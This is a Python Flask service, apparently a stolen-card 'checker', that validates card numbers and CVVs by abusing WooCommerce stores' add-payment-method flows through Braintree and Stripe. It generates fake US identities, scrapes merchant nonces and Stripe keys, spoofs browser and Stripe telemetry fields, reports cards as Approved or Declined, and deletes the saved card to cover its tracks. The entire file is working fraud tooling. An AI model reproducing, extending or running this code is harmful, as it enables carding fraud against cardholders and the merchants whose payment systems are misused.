import random
import re
import logging
from urllib.parse import urlparse
import requests
from faker import Faker
from lxml import html
from flask import Flask, request, jsonify
from functools import wraps
from datetime import datetime, timedelta
import time
import json

app = Flask(__name__)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Response messages
APPROVED = '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅'
DECLINED = '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌'
ERROR = '𝙀𝙍𝙍𝙊𝙍 ⚠️'

# Configuration
REQUEST_TIMEOUT = 15
CACHE_EXPIRY = timedelta(minutes=30)

fake = Faker("en_US")
DOMAINS = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]

# Cache for geographic data
geo_data_cache = {
    'data': None,
    'last_updated': None
}

def validate_input(func):
    """Decorator to validate input parameters"""
    @wraps(func)
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            logger.error(f"Validation error in {func.__name__}: {str(e)}")
            return None
    return wrapper

def rate_limited(max_per_minute):
    """Decorator to limit the rate of function calls"""
    interval = 60.0 / max_per_minute
    last_called = [0.0]

    def decorator(func):
        @wraps(func)
        def wrapped(*args, **kwargs):
            elapsed = time.time() - last_called[0]
            wait = interval - elapsed
            if wait > 0:
                time.sleep(wait)
            last_called[0] = time.time()
            return func(*args, **kwargs)
        return wrapped
    return decorator

def fetch_city_zipcode_data():
    """Fetch US geographic data from GitHub repository with caching"""
    now = datetime.now()
    
    if (geo_data_cache['data'] is not None and 
        geo_data_cache['last_updated'] is not None and
        (now - geo_data_cache['last_updated']) < CACHE_EXPIRY):
        return geo_data_cache['data']
    
    url = "https://raw.githubusercontent.com/ANYA-LZ/country-map/refs/heads/main/US.json"
    try:
        response = requests.get(url, timeout=REQUEST_TIMEOUT)
        response.raise_for_status()
        geo_data = response.json()
        
        geo_data_cache['data'] = geo_data
        geo_data_cache['last_updated'] = now
        
        return geo_data
    except requests.RequestException as e:
        logger.error(f"Failed to fetch geographic data: {str(e)}")
        return None

@validate_input
def generate_random_person():
    """Generate realistic US resident profile"""
    geo_data = fetch_city_zipcode_data()
    if not geo_data:
        logger.error("No geographic data available")
        return None

    state = random.choice(list(geo_data.keys()))
    city = random.choice(list(geo_data[state].keys()))
    zipcode = geo_data[state][city]

    return {
        'first_name': fake.first_name(),
        'last_name': fake.last_name(),
        'email': f"{fake.user_name()[:10]}@{random.choice(DOMAINS)}".lower(),
        'phone': _format_phone_number(zipcode),
        'address': fake.street_address(),
        'city': city,
        'state': state,
        'zipcode': zipcode,
        'country': "United States",
        'user_agent': fake.user_agent(),
    }

def _format_phone_number(zipcode):
    """Format phone number with area code matching zipcode"""
    base_num = fake.numerify("###-###-####")
    return f"({zipcode[:3]}) {base_num}"

@rate_limited(5)
def get_woocommerce_secrets(cookies, random_person, url):
    result = {
        'nonce': None,
        'pk_live': None,
        'accountId': None,
        'createSetupIntentNonce': None,
        'email': None  # Added email field
    }
    
    try:
        parsed_url = urlparse(url)
        origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        headers = {
            'User-Agent': random_person['user_agent'],
            'Origin': origin,
            'Referer': url,
        }
        
        with requests.Session() as session:
            session.headers.update(headers)
            response = session.post(
                url,
                data={'_wc_user_reg': 'true'},
                cookies=cookies,
                timeout=10
            )
            response.raise_for_status()

        # 1. Extract NONCE from HTML
        tree = html.fromstring(response.content)
        nonce = tree.xpath('//input[@id="woocommerce-add-payment-method-nonce"]/@value')
        result['nonce'] = nonce[0] if nonce else None

        # 2. Extract other data from JavaScript
        script_content = response.text
        
        # Regex for Stripe keys, nonces, and email
        pk_match = re.search(r'"publishableKey":"(pk_live_[^"]+)"', script_content)
        account_match = re.search(r'"accountId":"(acct_[^"]+)"', script_content)
        setup_intent_nonce_match = re.search(r'"createSetupIntentNonce":"([^"]+)"', script_content)
        email_match = re.search(r'"email":"([^"]+)"', script_content)
        
        result['pk_live'] = pk_match.group(1) if pk_match else None
        result['accountId'] = account_match.group(1) if account_match else None
        result['createSetupIntentNonce'] = setup_intent_nonce_match.group(1) if setup_intent_nonce_match else None
        result['email'] = email_match.group(1) if email_match else None

        return result

    except requests.RequestException as e:
        logging.error(f"Request failed: {str(e)}")
        return result
    except Exception as e:
        logging.error(f"Unexpected error: {str(e)}")
        return result

def delete_payment_method(cookies, random_person, url):
    """Execute payment method deletion and return success status"""
    try:
        headers = {
            'User-Agent': random_person['user_agent'],
            'Referer': url,
        }
        
        with requests.Session() as session:
            session.headers.update(headers)
            
            # Get account page to find delete URL
            account_response = session.get(
                url,
                cookies=cookies,
                timeout=REQUEST_TIMEOUT
            )
            account_response.raise_for_status()
            
            tree = html.fromstring(account_response.content)
            delete_url = tree.xpath(
                '//td[contains(@class, "payment-method-actions")]'
                '//a[contains(@class, "delete")]/@href'
            )
            
            if not delete_url:
                logger.warning("Delete URL not found")
                return False
                
            # Execute deletion
            delete_response = session.get(
                delete_url[0],
                cookies=cookies,
                allow_redirects=True,
                timeout=REQUEST_TIMEOUT
            )
            delete_response.raise_for_status()
            
            return "Payment method deleted" in delete_response.text
            
    except requests.RequestException as e:
        logger.error(f"Request failed in delete_payment_method: {str(e)}")
        return False
    except Exception as e:
        logger.error(f"Unexpected error in delete_payment_method: {str(e)}")
        return False
    
def format_credit_card(number):
    cleaned = ''.join(filter(str.isdigit, str(number)))
    return ' '.join(cleaned[i:i+4] for i in range(0, len(cleaned), 4))
    
@validate_input
def get_stripe_auth_id(random_person, card_info, pk_live, accountId, email, url):
    """Generate payment token through Braintree API"""
    parsed_url = urlparse(url)
    origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
    if not isinstance(random_person, dict) or 'zipcode' not in random_person:
        logger.error("Invalid random_person parameter")
        return None, None

    formatted_card_number = ' '.join([card_info['number'][i:i+4] for i in range(0, len(card_info['number']), 4)])
    year_short = str(card_info['year'])[-2:]

    time_on_page = str(random.randint(120000, 240000))

    headers = {
        'User-Agent': random_person['user_agent'],
        'Accept': "application/json",
        'sec-ch-ua-mobile': "?1",
        'origin': "https://js.stripe.com",
        'referer': "https://js.stripe.com/"
    }

    payload = {
        'billing_details[name]': " ",
        'billing_details[email]': email,
        'billing_details[address][country]': "US",
        'type': "card",
        'card[number]': formatted_card_number,
        'card[cvc]': card_info['cvv'],
        'card[exp_year]': year_short,
        'card[exp_month]': card_info['month'],
        'allow_redisplay': "unspecified",
        'pasted_fields': "number",
        'payment_user_agent': "stripe.js/b85ba7b837; stripe-js-v3/b85ba7b837; payment-element; deferred-intent",
        'referrer': origin,
        'time_on_page': time_on_page,
        'client_attribution_metadata[client_session_id]': fake.uuid4(),
        'client_attribution_metadata[merchant_integration_source]': "elements",
        'client_attribution_metadata[merchant_integration_subtype]': "payment-element",
        'client_attribution_metadata[merchant_integration_version]': "2021",
        'client_attribution_metadata[payment_intent_creation_flow]': "deferred",
        'client_attribution_metadata[payment_method_selection_flow]': "merchant_specified",
        'guid': fake.uuid4(),
        'muid': fake.uuid4(),
        'sid': fake.uuid4(),
        'key': pk_live,
        '_stripe_account': accountId
    }

    try:
        response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers,
            data=payload,
            timeout=REQUEST_TIMEOUT
        )
        response.raise_for_status()
        response_data = response.json()
        
        payment_id = response_data.get('id')
        if not payment_id:
            return False
        return payment_id
        
    except requests.RequestException as e:
        logger.error(f"Request failed in get_token: {str(e)}")
        return False
    except (KeyError, ValueError) as e:
        logger.error(f"Invalid response data: {str(e)}")
        return False

@validate_input
def get_bar_auth_token(card_info, random_person, access_token):
    """Generate payment token through Braintree API"""
    
    if not isinstance(random_person, dict) or 'zipcode' not in random_person:
        logger.error("Invalid random_person parameter")
        return None, None

    headers = {
        'Authorization': f'Bearer {access_token}',
        'braintree-version': '2018-05-10',
        'Content-Type': 'application/json',
    }

    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": fake.uuid4()
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
        "variables": {
            "input": {
            "creditCard": {
                "number": card_info['number'],
                "expirationMonth": card_info['month'],
                "expirationYear": card_info['year'],
                "cvv": card_info['cvv'],
                "billingAddress": {
                "postalCode": random_person['zipcode'],
                "streetAddress": ""
                }
            },
            "options": {
                "validate": False
            }
            }
        },
        "operationName": "TokenizeCreditCard"
    }

    try:
        response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=headers,
            json=payload,
            timeout=REQUEST_TIMEOUT
        )
        response.raise_for_status()
        response_data = response.json()
        
        # Validate response structure
        if not response_data.get('data', {}).get('tokenizeCreditCard'):
            logger.error("Unexpected response structure from Braintree API")
            return None, None
            
        token_data = response_data['data']['tokenizeCreditCard']
        brandCode = token_data['creditCard']['brandCode']
        token = token_data['token']
        return token, brandCode
        
    except requests.RequestException as e:
        logger.error(f"Request failed in get_token: {str(e)}")
        return None, None
    except (KeyError, ValueError) as e:
        logger.error(f"Invalid response data: {str(e)}")
        return None, None
    
def get_payload_bar_auth_info_v2(auth_token):

    url = "https://payments.braintree-api.com/graphql"
    
    # GraphQL query payload
    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(fake.uuid4())
        },
        "query": "query ClientConfiguration { clientConfiguration { analyticsUrl environment merchantId assetsUrl clientApiUrl creditCard { supportedCardBrands challenges threeDSecureEnabled threeDSecure { cardinalAuthenticationJWT } } applePayWeb { countryCode currencyCode merchantIdentifier supportedCardBrands } paypal { displayName clientId assetsUrl environment environmentNoNetwork unvettedMerchant braintreeClientId billingAgreementsEnabled merchantAccountId currencyCode payeeEmail } supportedFeatures } }",
        "operationName": "ClientConfiguration"
    }

    headers = {
        "Authorization": f"Bearer {auth_token}",
        "braintree-version": "2018-05-10",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    try:
        response = requests.post(
            url,
            json=payload,
            headers=headers,
            timeout=10
        )

        # Check for HTTP errors
        response.raise_for_status()

        # Parse JSON response
        config_data = response.json()

        # Validate response structure
        if "data" not in config_data or "clientConfiguration" not in config_data["data"]:
            raise ValueError("Invalid response structure from Braintree API")

        return config_data["data"]["clientConfiguration"]

    except requests.exceptions.RequestException as e:
        print(f"Request failed: {str(e)}")
        return None
    except json.JSONDecodeError as e:
        print(f"Failed to parse JSON response: {str(e)}")
        return None
    except ValueError as e:
        print(f"Invalid response data: {str(e)}")
        return None
    
def generate_payload_payment(random_person, gateway_config, card_info, cookies):
    secrets = get_woocommerce_secrets(cookies, random_person, gateway_config['url'])

    # Corrected the typo from 'gataway_type' to 'gateway_type'
    if "Braintree Auth" in gateway_config['gateway_type']:
        token, brandCode = get_bar_auth_token(
            card_info,
            random_person,
            gateway_config["access_token"]
        )

        if not token or not brandCode:
            logger.error("Failed to get token or brand code")
            return False, "Failed to fetch token or brand code"
        
        if "v1_with_cookies" in gateway_config['version']:
            if not (nonce := secrets.get('nonce')):
                logger.error("Failed to fetch nonce")
                return False, "Failed to fetch nonce"
            
            # Fixed duplicate wc_braintree_device_data key
            payload = {
                'payment_method': "braintree_credit_card",
                'wc-braintree-credit-card-card-type': brandCode,
                'wc-braintree-credit-card-3d-secure-enabled': "",
                'wc-braintree-credit-card-3d-secure-verified': "",
                'wc-braintree-credit-card-3d-secure-order-total': "0.00",
                'wc_braintree_credit_card_payment_nonce': token,
                'wc_braintree_device_data': json.dumps({"correlation_id": str(fake.uuid4())}),
                'wc-braintree-credit-card-tokenize-payment-method': "true",
                'wc_braintree_paypal_payment_nonce': "",
                'wc-braintree-paypal-context': "shortcode",
                'wc_braintree_paypal_amount': "0.00",
                'wc_braintree_paypal_currency': "USD",
                'wc_braintree_paypal_locale': "en_us",
                'wc-braintree-paypal-tokenize-payment-method': "true",
                'woocommerce-add-payment-method-nonce': nonce,
                '_wp_http_referer': "/my-account/add-payment-method/",
                'woocommerce_add_payment_method': "1"
            }
        
        elif "v2_with_cookies" in gateway_config['version']:
            payload_config = get_payload_bar_auth_info_v2(gateway_config["access_token"])
            if not payload_config:
                logger.error("Failed to get Braintree Auth payload info v2")
                return False, "Failed to get Braintree Auth payload info v2"
            
            if not (nonce := secrets.get('nonce')):
                logger.error("Failed to fetch nonce")
                return False, "Failed to fetch nonce"
            
            config_data = {
                "environment": payload_config["environment"],
                "clientApiUrl": payload_config["clientApiUrl"],
                "assetsUrl": payload_config["assetsUrl"],
                "merchantId": payload_config["merchantId"],
                "analytics": {"url": payload_config["analyticsUrl"]},
                "creditCards": {
                    "supportedCardTypes": payload_config["creditCard"]["supportedCardBrands"]
                },
                "challenges": payload_config["creditCard"]["challenges"],
                "threeDSecureEnabled": payload_config["creditCard"]["threeDSecureEnabled"],
                "paypal": payload_config["paypal"],
                "applePayWeb": payload_config["applePayWeb"]
            }
        
            payload = {
                "payment_method": "braintree_cc",
                "braintree_cc_nonce_key": token,
                "braintree_cc_device_data": json.dumps({
                    "device_session_id": str(fake.uuid4()),
                    "correlation_id": str(fake.uuid4())
                }),
                "braintree_cc_config_data": json.dumps(config_data),
                "woocommerce-add-payment-method-nonce": nonce,
                "_wp_http_referer": "/my-account/add-payment-method/",
                "woocommerce_add_payment_method": "1"
            }

    elif "Stripe Auth" in gateway_config['gateway_type']:
        if "v1_with_cookies" in gateway_config['version']:

            if not (pk_live := secrets.get('pk_live')):
                logger.error("Failed to fetch pk live")
                return False, "Failed to fetch pk live"
            
            if not (accountId := secrets.get('accountId')):
                logger.error("Failed to fetch accountId")
                return False, "Failed to fetch accountId"
            
            if not (email := secrets.get('email')):
                logger.error("Failed to fetch email")
                return False, "Failed to fetch email"
            
            if not (payment_id := get_stripe_auth_id(random_person, card_info, pk_live, accountId, email, gateway_config['url'])):
                logger.error("Failed to fetch ID")
                return False, "Failed to fetch ID"
            
            if not (ajax_nonce := secrets.get('createSetupIntentNonce')):
                logger.error("Failed to fetch ajax nonce")
                return False, "Failed to fetch ajax nonce"
            
            payload = {
                'action': 'create_setup_intent',
                'wcpay-payment-method': payment_id,
                '_ajax_nonce': ajax_nonce
            }
        
    else:
        logger.error(f"Unsupported gateway type: {gateway_config['gateway_type']}")
        return False, f"Unsupported gateway type: {gateway_config['gateway_type']}"

    return True, payload
    
def process_payment(random_person, gateway_config, card_info):
    """Execute payment processing through WooCommerce endpoint"""
    parsed_url = urlparse(gateway_config["url"])
    origin = f"{parsed_url.scheme}://{parsed_url.netloc}"

    # Validate cookies
    cookies_list = gateway_config.get("cookies", [])
    if not cookies_list:
        logger.error("No cookies provided")
        return ERROR, "Cookies are missing in gateway config"
    
    cookies_dict = {}
    for cookie in cookies_list:
        if 'name' not in cookie or 'value' not in cookie:
            logger.error("Invalid cookie format")
            return ERROR, "Invalid cookie format"
        cookies_dict[cookie["name"]] = cookie["value"]

    status, result = generate_payload_payment(random_person, gateway_config, card_info, cookies_dict)
    if not status:
        return ERROR, result
    
    payload = result
    
    headers = {
        'User-Agent': random_person['user_agent'],
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': origin,
        'Referer': gateway_config["url"],
    }

    try:
        response = requests.post(
            url=gateway_config["post_url"],
            headers=headers,
            cookies=cookies_dict,
            data=payload,
            timeout=REQUEST_TIMEOUT
        )
        return _parse_payment_response(response.content, cookies_dict, random_person, gateway_config["success_message"], gateway_config["error_message"], origin)
    except requests.RequestException as e:
        logger.error(f"Payment request failed: {str(e)}")
        return ERROR, f"Request failed: {str(e)}"

def _parse_payment_response(content, cookies, random_person, success_xpath, error_xpath, origin):
    """Parse and interpret payment gateway response (HTML or JSON)"""
    try:
        # First try to parse as JSON
        try:
            data = json.loads(content)
            
            # Check for success in JSON response
            if data.get('success') is True:
                message = 'Approved'
                return APPROVED, message
            
            # Check for error in JSON response
            error_message = data.get('data', {}).get('error', {}).get('message', 'Unknown error').split('Error: ')[-1]
                
            return DECLINED, error_message
            
        except json.JSONDecodeError:
            # If not JSON, parse as HTML
            tree = html.fromstring(content)
            extracted_message = "Unknown response"

            # Check for success in HTML
            success = tree.xpath(success_xpath)
            if success:
                message = 'Approved'
                if not delete_payment_method(cookies, random_person, f"{origin}/my-account/payment-methods/"):
                    message = 'Approved (error delete)'
                return APPROVED, message

            # Check for errors in HTML
            error = tree.xpath(error_xpath)
            if error:
                error_message = error[0].strip()
                match = re.search(r":\s*(.*?)(?=\s*\(|$)", error_message)
                extracted_message = match.group(1) if match else error_message
                
                if "Duplicate card exists in the vault" in extracted_message:
                    extracted_message = 'Approved old try again'
                    if not delete_payment_method(cookies, random_person, f"{origin}/my-account/payment-methods/"):
                        extracted_message = 'Approved old try again (error delete)'
                    return APPROVED, extracted_message

                return DECLINED, extracted_message
        
        # No success or error found in either format
        logger.warning("No success or error message found in response")
        return ERROR, "No success or error message found in response"
        
    except Exception as e:
        logger.error(f"Response parsing failed: {str(e)}")
        return ERROR, f"Parsing failed: {str(e)}"

@app.route('/')
def index():
    return "Payment Gateway Service"

@app.route('/payment', methods=['POST'])
def handle_payment():
    start_time = time.time()
    logger.info("Received payment request")
    
    try:
        data = request.get_json()
        if not data:
            logger.error("No data received in request")
            return jsonify({"status": ERROR, "result": "No data received"}), 400
        
        # Validate gateway configuration
        gateway_config = data.get('gateway_config')
        if not gateway_config:
            logger.error("Missing gateway configuration")
            return jsonify({"status": ERROR, "result": "Gateway configuration is missing"}), 400
        
        required_gateway_fields = ['cookies', 'url', 'access_token', 'success_message', 'error_message', 'gateway_type']
        for field in required_gateway_fields:
            if field not in gateway_config:
                logger.error(f"Missing required field in gateway config: {field}")
                return jsonify({"status": ERROR, "result": f"{field} is missing in gateway config"}), 400
        
        # Validate card information
        card_info = data.get('card')
        if not card_info:
            logger.error("No card information provided")
            return jsonify({"status": ERROR, "result": "Card information is missing"}), 400
        
        required_card_fields = ['number', 'month', 'year', 'cvv']
        for field in required_card_fields:
            if field not in card_info or not card_info[field]:
                logger.error(f"Missing required card field: {field}")
                return jsonify({"status": ERROR, "result": f"{field} is missing in card info"}), 400
        
        # Generate random person profile
        random_person = generate_random_person()
        if not random_person:
            logger.error("Failed to generate random person profile")
            return jsonify({"status": ERROR, "result": "Failed to generate random person"}), 400
        
        # Process payment
        status, result = process_payment(
            random_person,
            gateway_config,
            card_info
        )
        
        logger.info(f"Payment processed - Status: {status}, Result: {result}")
        logger.info(f"Request processing time: {time.time() - start_time:.2f} seconds")

        if ERROR in status:
            return jsonify({
                "status": status,
                "result": result,
            }), 400
        
        else:
            return jsonify({
                "status": status,
                "result": result,
            }), 200
        
    except Exception as e:
        logger.error(f"Unexpected error in handle_payment: {str(e)}", exc_info=True)
        return jsonify({
            "status": ERROR,
            "result": "Internal server error"
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
